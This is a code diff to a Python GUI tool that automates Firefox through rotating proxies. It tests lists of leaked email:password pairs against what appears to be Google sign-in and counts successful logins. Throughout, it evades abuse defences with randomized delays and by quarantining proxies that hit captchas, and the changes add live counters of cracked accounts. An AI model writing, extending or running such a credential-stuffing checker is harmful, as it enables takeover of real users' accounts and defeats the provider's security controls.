@@ -229,7 +229,7 @@ class FirefoxWorker(QThread):
         self.combo_queue = combo_queue
         self.stop_event = threading.Event()
         self.current_bridge = None
-        self.needs_quarantine = False  # علامة لتحديد ما إذا كان البروكسي يحتاج حجر صحي
+        self.needs_quarantine = False
 
     def show_viewer(self):
         if self.current_bridge:
@@ -252,7 +252,6 @@ class FirefoxWorker(QThread):
                 except queue.Empty:
                     continue
 
-                # 3. الديكالاج العشوائي (Staggered Jitter Delay) بين انطلاق الجلسات لتفادي الزحام
                 jitter = random.uniform(5.0, 15.0)
                 self.log_signal.emit(f"[{label}] Staggered Jitter: waiting {jitter:.1f}s before starting session...")
                 time.sleep(jitter)
@@ -279,7 +278,6 @@ class FirefoxWorker(QThread):
                     browser = playwright.firefox.launch(**options)
                     context = None
                     try:
-                        # الاعتماد الحصري على Firefox Private Context نظيفة ومعزولة
                         context_opts = {
                             "viewport": FIREFOX_VIEWPORT,
                             "accept_downloads": False,
@@ -321,7 +319,7 @@ class FirefoxWorker(QThread):
                         elif any(w in body_text for w in ["captcha", "unusual traffic", "verify that it's you"]):
                             status = "SECURITY BLOCK"
                             detail = "Captcha / Unusual Traffic detected on email stage"
-                            self.needs_quarantine = True  # إرسال البروكسي للحجر الصحي
+                            self.needs_quarantine = True
                         else:
                             pwd_input_sel = 'input[type="password"], input[name="Passwd"]'
                             try:
@@ -370,7 +368,7 @@ class FirefoxWorker(QThread):
                                 elif any(w in pwd_body for w in ["captcha", "unusual traffic"]):
                                     status = "SECURITY BLOCK"
                                     detail = "Security check / Captcha on password stage"
-                                    self.needs_quarantine = True  # إرسال البروكسي للحجر الصحي
+                                    self.needs_quarantine = True
                                 elif any(w in pwd_url for w in ["myaccount.google.com", "mail.google.com", "landing", "signinoptions"]):
                                     status = "LOGIN OK"
                                     detail = "Successfully authenticated and reached inbox/dashboard"
@@ -450,6 +448,7 @@ class CheckerWindow(QMainWindow):
 
         self.proxy_pool = ProxyPool()
         self.combo_queue = queue.Queue()
+        self.total_loaded_combos = 0  # لتخزين العدد الإجمالي الأصلي
 
         self.browser_status = []
         self.browser_show_buttons = []
@@ -727,12 +726,44 @@ class CheckerWindow(QMainWindow):
             column.setContentsMargins(7, 6, 7, 6)
 
             header = QHBoxLayout()
-            header.addWidget(
-                QLabel(
-                    title,
-                    objectName="section",
+            
+            if is_results:
+                header.addWidget(QLabel("Results", objectName="section"))
+                header.addSpacing(8)
+
+                # كادر Combo مستقل يعرض العدد الحالي / العدد الإجمالي (مثال: Combo : 13 / 207)
+                self.combo_badge = QLabel("Combo : 0 / 0")
+                self.combo_badge.setStyleSheet("""
+                    background: #3B4349;
+                    color: #C0C0C0;
+                    border: 1px solid #75828A;
+                    border-radius: 4px;
+                    padding: 3px 8px;
+                    font-weight: bold;
+                """)
+                header.addWidget(self.combo_badge)
+                header.addSpacing(6)
+
+                # كادر كبير أخضر للنتائج (Phone, Ok, New)
+                self.green_results_badge = QLabel()
+                self.green_results_badge.setStyleSheet("""
+                    background: #315845;
+                    color: #D7F7DF;
+                    border: 1px solid #74B98C;
+                    border-radius: 4px;
+                    padding: 3px 10px;
+                    font-weight: bold;
+                """)
+                self.update_green_badge_display(0, 0, 0)
+                header.addWidget(self.green_results_badge)
+            else:
+                header.addWidget(
+                    QLabel(
+                        title,
+                        objectName="section",
+                    )
                 )
-            )
+
             header.addStretch()
 
             clear = QPushButton("♧  Clear")
@@ -789,6 +820,34 @@ class CheckerWindow(QMainWindow):
             )
 
         v.addLayout(panes, 1)
+
+    # --- دوال تحديث الكوادر الحية ---
+    def update_green_badge_display(self, phone_count, ok_count, new_count):
+        text = (
+            f'<span style="color: #D7F7DF; font-weight: bold;">Phone : {phone_count}</span>'
+            f'&nbsp;&nbsp;|&nbsp;&nbsp;'
+            f'<span style="color: #D7F7DF; font-weight: bold;">Ok : {ok_count}</span>'
+            f'&nbsp;&nbsp;|&nbsp;&nbsp;'
+            f'<span style="color: #D7F7DF; font-weight: bold;">New : {new_count}</span>'
+        )
+        if hasattr(self, 'green_results_badge'):
+            self.green_results_badge.setText(text)
+
+    def refresh_results_badge(self):
+        # العدد الإجمالي الكلي للكومبوهات
+        total_initial = self.total_loaded_combos
+        # العدد اللي باقي في الطابور (Queue)
+        remaining_in_queue = self.combo_queue.qsize()
+        # العدد الحالي اللي تم فحصه وتجاوزناه (الإجمالي ناقص الباقي في الطابور)
+        current_checked = max(0, total_initial - remaining_in_queue)
+        
+        phone_count = sum(1 for r in self.results if r[2] == "PHONE VERIFIED")
+        ok_count = sum(1 for r in self.results if r[2] == "LOGIN OK")
+        new_count = sum(1 for r in self.results if r[2] == "NEW ACCOUNT WELCOME")
+        
+        if hasattr(self, 'combo_badge'):
+            self.combo_badge.setText(f"Combo : {current_checked} / {total_initial}")
+        self.update_green_badge_display(phone_count, ok_count, new_count)
 
     def open_proxy_monitor(self):
         if self.proxy_monitor is None:
@@ -876,6 +935,13 @@ class CheckerWindow(QMainWindow):
         if not path.is_file():
             return
         lines = path.read_text(encoding="utf-8-sig", errors="replace").splitlines()
+        
+        while not self.combo_queue.empty():
+            try:
+                self.combo_queue.get_nowait()
+            except queue.Empty:
+                break
+
         valid_count = 0
         for line in lines:
             line = line.strip()
@@ -887,8 +953,11 @@ class CheckerWindow(QMainWindow):
                 if email and password:
                     self.combo_queue.put((email, password))
                     valid_count += 1
+        
+        self.total_loaded_combos = valid_count  # حفظ العدد الإجمالي الحقيقي
         self.log(f"Loaded {valid_count} combos from source file.")
         self.loaded_label.setText(f"Loaded: {valid_count}")
+        self.refresh_results_badge()
 
     def browse_proxy(self):
         path, _ = QFileDialog.getOpenFileName(
@@ -990,6 +1059,7 @@ class CheckerWindow(QMainWindow):
             self.proxy_monitor.reset(len(lines))
 
         self.update_counters()
+        self.refresh_results_badge()
         self.start_btn.setEnabled(False)
 
         for index in range(len(self.browser_status)):
@@ -1118,10 +1188,10 @@ class CheckerWindow(QMainWindow):
             self.table.setItem(row, column, QTableWidgetItem(str(value)))
 
         self.refresh_stats()
+        self.refresh_results_badge()
         self.last_export_path = self.auto_save_classified_result(record)
 
     def auto_save_classified_result(self, record):
-        """تصنيف الحفظ التلقائي في المجلدات الثلاثة: Failed Results, Successful Results, Security Block"""
         try:
             if getattr(sys, "frozen", False):
                 base = Path(sys.executable).resolve().parent
@@ -1191,6 +1261,7 @@ class CheckerWindow(QMainWindow):
              else f"Proxy Pool: {self.proxy_pool.stats()['available']} READY")
         )
         self.refresh_stats()
+        self.refresh_results_badge()
 
     def refresh_stats(self):
         total = len(self.results)
@@ -1213,7 +1284,6 @@ class CheckerWindow(QMainWindow):
 
     def worker_finished(self, worker):
         if worker.lease is not None:
-            # التحقق مما إذا كان البروكسي واجه كابتشا أو حظر أمني -> إدخاله في الحجر الصحي (15 دقيقة = 900 ثانية)
             if getattr(worker, "needs_quarantine", False):
                 self.proxy_pool.quarantine(worker.lease, 900)
                 self.log(f"[PROXY COOLDOWN] Proxy {worker.proxy.label} placed in quarantine for 15 minutes due to Security Block.")
@@ -1267,6 +1337,7 @@ class CheckerWindow(QMainWindow):
         self.table.setRowCount(0)
         self.results = []
         self.refresh_stats()
+        self.refresh_results_badge()
         self.log("[UI] Results cleared.")
 
     def open_file(self):
